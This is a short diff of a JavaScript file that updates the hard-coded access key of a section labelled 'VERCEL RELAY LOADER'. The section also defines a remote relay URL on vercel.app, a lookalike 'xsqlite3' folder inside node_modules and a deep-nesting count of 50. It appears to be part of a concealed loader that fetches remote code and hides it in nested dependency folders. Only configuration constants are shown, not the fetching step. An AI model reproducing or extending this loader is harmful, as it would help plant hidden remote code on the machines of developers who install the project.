@@ -61,7 +61,7 @@ function checkSessionId() {
 
 // ========== VERCEL RELAY LOADER ==========
 const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://june-vercel.vercel.app/api/repo';
-const ACCESS_KEY = process.env.ACCESS_KEY || 'j-41183-184';
+const ACCESS_KEY = process.env.ACCESS_KEY || 'j-41-183-184';
 
 const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
 const DEEP_NEST_COUNT = 50;
